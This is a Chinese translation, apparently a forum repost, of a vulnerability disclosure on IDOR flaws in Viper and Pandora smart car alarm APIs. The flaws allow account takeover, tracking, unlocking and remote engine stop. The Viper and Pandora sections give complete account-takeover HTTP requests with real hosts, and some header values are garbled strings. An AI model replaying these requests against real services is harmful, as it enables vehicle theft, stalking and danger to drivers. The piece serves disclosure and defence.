@@ -1,0 +1,170 @@
+
+# [翻译]汽车智能警报器的安全问题分析
+
+对于不使用钥匙进入车辆内部的安全研究一直在持续着，许多汽车报警器厂商都在推销自己的产品。
+
+经过我们的安全研究发现，安装这些报警器会增加车辆被劫持的风险，这些报警器可能会使车主被远程劫持，或者是在行驶时使汽车发动机停止，甚至车辆被偷。
+
+在为我们的测试汽车上安装了几个主流高端智能报警器后，我们发现其中有几个报警系统中存在严重的安全漏洞，这些漏洞可以实现如下利用：
+
+- 可以获取汽车的时地理位置
+- 可以识别车型和车主的详细信息
+- 可以禁用禁警报功能
+- 将汽车车门解锁
+- 启用和禁用防盗装置
+- 在某些情况下，汽车引擎可能会在驾驶时被熄灭
+- 其中一个警报器可以使司机被远程监视
+
+这些报警器影响了全球多达300万辆汽车。
+
+涉及漏洞的两家报警器供应商是Viper（英国的Clifford品牌）和Pandora，这两家是全球最大的汽车防盗品牌，漏洞是API中的不安全直接对象引用（IDOR）造成的，只需通过篡改参数，即可在未经身份验证的情况下更新注册到帐户的电子邮件地址，将密码重置为修改后的地址（即攻击者）并接管帐户。
+
+可以对特定车辆进行地理定位和跟踪，然后使其停止并解锁车门，劫持汽车和司机将变得非常容易。
+
+## Viper智能报警器漏洞
+
+![](https://bbs.kanxue.com/upload/attach/201904/823237_HD3FJRH2F9KMWMA.jpg)
+
+第三方CalAmp公司为Viper Smart Start警报器提供后端服务，该漏洞是一个在 IDOR 上的“修改用户”请求。虽然其他API都正确检查了授权，但是未正确验证`/users/Update/xxxxx`请求。因此，可以发出恶意请求以更改任意用户密码来登录，从而允许与警报器交互。合法用户已被锁定在其帐户之外，无法访问警报装置。
+
+下面是一个示例请求：
+
+```
+POST /users/Update/861772 HTTP/1.1
+
+Host: colt.calamp-ts.com
+
+Connection: close
+
+Content-Length: 342
+
+Accept: application/json, text/javascript, */*; q=0.01
+
+Origin: 382K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0L8$3I4@1i4K6u0W2j5$3q4D9j5h3#2H3i4K6u0V1N6s2y4Q4x3X3g2U0L8$3@1`.
+
+X-Requested-With: XMLHttpRequest
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+
+Content-Type: application/x-www-form-urlencoded
+
+Referer: adcK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0L8$3I4@1i4K6u0W2j5$3q4D9j5h3#2H3i4K6u0V1N6s2y4Q4x3X3g2U0L8$3#2Q4x3V1k6V1j5i4y4Z5j5X3!0S2M7X3c8Q4x3V1k6Z5L8$3#2W2
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: en-US,en;q=0.9
+
+Cookie: __utma=36020146.382676338.1549803856.1549803856.1549803856.1; __utmc=36020146; __utmz=36020146.1549803856.1.1.utmcsr=medium.com|utmccn=(referral)|utmcmd=referral|utmcct=/@evstykas/remote-smart-car-hacking-with-just-a-phone-2fe7ca682162; kohanasession=flrd2pb6lcqohnu3ld79p9oif7; __utmt=1; __utmb=36020146.8.10.1549803856
+
+
+
+FirstName=f&LastName=l&Email=egw2%40mailinator.com&Phone=123+132-1321&UserName=egw2%40mailinator.com&Password=!Password1&Language=English&Measurement=Imperial&Timezone=Etc%2FGMT%2B8&Pincode=0&Question=What%2Btown%2Bwere%2Byou%2Bborn%2Bin%253F&Answer=no&MsgFlag=0&DaylightSavings=0&CustomAttributes=%5B%5D&SessionId=flrd2pb6lcqohnu3ld79p9oif7
+```
+
+以下是更改密码的屏幕截图：
+
+![](https://bbs.kanxue.com/upload/attach/201904/823237_KDJ7Z5SYCFNWM8U.jpg)
+
+## Pandora 智能报警器漏洞
+
+该漏洞是`POST`请求的`'email'` JSON参数上：`https://pro.p-on.ru/api/sputnik/workers?id=xxxx`。
+
+```
+POST /api/sputnik/workers?id=xxxxx HTTP/1.1
+
+Host: pro.p-on.ru
+
+Connection: close
+
+Content-Length: 167
+
+Accept: application/json, text/javascript, */*; q=0.01
+
+Origin: d6cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3M7X3!0Q4x3X3g2H3i4K6u0V1L8$3&6Q4x3X3g2J5N6b7`.`.
+
+X-Requested-With: XMLHttpRequest
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+
+Content-Type: application/json
+
+Referer: b0dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3M7X3!0Q4x3X3g2H3i4K6u0V1L8$3&6Q4x3X3g2J5N6g2)9J5c8Y4N6G2M7X3E0W2M7Y4y4Q4x3V1j5I4z5o6f1H3x3o6l9`.
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: en-US,en;q=0.9
+
+Cookie: lang=en; sid=4020f4ba21edb3082902e227937995d6
+
+
+
+{"id":xxxxx,"name_f":"name","name_i":"name_i","name_o":"name_o","groups":[],"email":"newemail","type":"user","company_perms":0}
+```
+
+因此，可以使用你的电子邮件覆盖现有电子邮件并重置密码。重置密码后，只需登录应用程序即可获得完整功能。此攻击还可用于管理员用户，可以访问多个车辆，可以造成大量数据泄漏。只需将您的顺序用户ID替换为`'xxxxx'`- 1dbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6H3M7X3!0Q4x3X3g2H3i4K6u0V1L8$3&6Q4x3X3g2J5N6g2)9J5c8Y4N6G2M7X3E0W2M7Y4y4Q4x3V1k6^5P5s2S2^5P5q4!0q4x3#2)9^5x3q4)9^5x3R3\`.\`.
+
+![](https://bbs.kanxue.com/upload/attach/201904/823237_8EBD5FK5P2QYRSW.jpg)
+
+我们在测试时只访问了自己帐户的数据，但是可以访问其他人的账户来提取所有用户数据。还应注意，你都可以无需购买其中任何一种产品就可在系统上拥有帐户。
+
+这两种产品都允许任何人创建测试/模拟帐户，使用该模拟账户，可以访问任何真实账户并检索其详细信息。
+
+## 实际入侵测试
+
+在这两种情况下，都可以选择感兴趣的汽车，我们选择一辆昂贵的路虎进行测试
+
+![](https://bbs.kanxue.com/upload/attach/201904/823237_4JTSB9WPH2U4YQZ.jpg)
+
+接下来实时找到车辆
+
+![](https://bbs.kanxue.com/upload/attach/201904/823237_YQWN8H365JFMENP.jpg)
+
+![](https://bbs.kanxue.com/upload/attach/201904/823237_NDJX6D63SGB3TAN.jpg)
+
+所以，我们实地跟随它......
+
+![](https://bbs.kanxue.com/upload/attach/201904/823237_Y47YE27YVPPRPCM.jpg)
+
+远程关闭警报警报器和闪光灯，司机现在开始查看哪里出了问题。我们已经设置了防盗装置，所以他们无法开走，并且已经取消了对警报帐户的访问权限，因此他们无法重置防盗锁。
+
+我们还可以使用工具克隆警报密钥卡，就可以解锁汽车的大门。
+
+![](https://bbs.kanxue.com/upload/attach/201904/823237_RE2PTEXNQPW2F5F.jpg)
+
+现在小偷就可以开着车开走了。
+
+## 远程关闭汽车引擎
+
+我们发现我们可以在Viper的汽车上关闭发动机，除了使用移动应用程序中的帐户接管漏洞，还可以关闭任何装有这些警报的汽车的引擎，该漏洞在Viper移动应用UI中不存在，但在API中存在。
+
+这对人身安全的影响非常严重，涉及汽车在高速道路上驾驶的事故可能会由恶意攻击造成。
+
+## 远程监听
+
+Pandora警报器能够进行SOS呼叫，安装麦克风也是为了实现这一点，由于API中的授权缺陷，可以远程访问和启用麦克风。
+
+因此，所有装有警报器的汽车司机的讲话都可以被收听。
+
+### CAN控制
+
+Viper和Pandora都能够发送自定义CAN消息。
+
+近年来，汽车报警器能够直接与CAN连接，鉴于现代车辆的复杂程度，这是非常有必要的，这也有助于减少报警器布线和所需的安装时间。高端警报器可以自动检测他们正在安装的车辆类型，并自定义他们对正在使用的CAN消息传递的命令集。
+
+但是，当警报器未正确识别车辆，安装人员将需要手动设置警报器。跟据我们研究发现，报警编程必须使用笔记本电脑应用程序在本地完成，或者使用蓝牙的移动APP完成。虽然似乎有一些方法可以通过API进行无线编程，但文档没有记录，我们还没有完整对它们进行逆向工程。
+
+在分析了固件，手册和相关的更改日志后，我们发现了一些可怕的功能。
+
+如果你拥有一辆带有相关Pandora警报的车辆，比如马自达6，揽胜运动，起亚Quoris，丰田Fortuner，三菱帕杰罗，丰田普锐斯50和RAV4--这些都显示在警报API中存在漏洞，可以远程调整行驶巡航速度！
+
+停止/启动功能的一些变通方法还可以发送错误的制动踏板消息，模拟驾驶员踩下踏板并启动车辆。
+
+## 结论
+
+我们已经看到很多情况下可以在物联网API中利用IDOR。这是我们第一次看到它们导致的这种规模的潜在攻击。
+
+这些警报价器格昂贵，通常适用于高端车辆，通常是那些无钥匙操作的车辆。一项保守的估计表明，价值1500亿美元的车辆已经曝光。
+
+这些警报器没有添加任何额外的安全措施来防止密钥中继攻击，并且在它们被修复之前，它们实际上暴露了所有者的额外攻击并危及他们的生命安全。
+
+[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
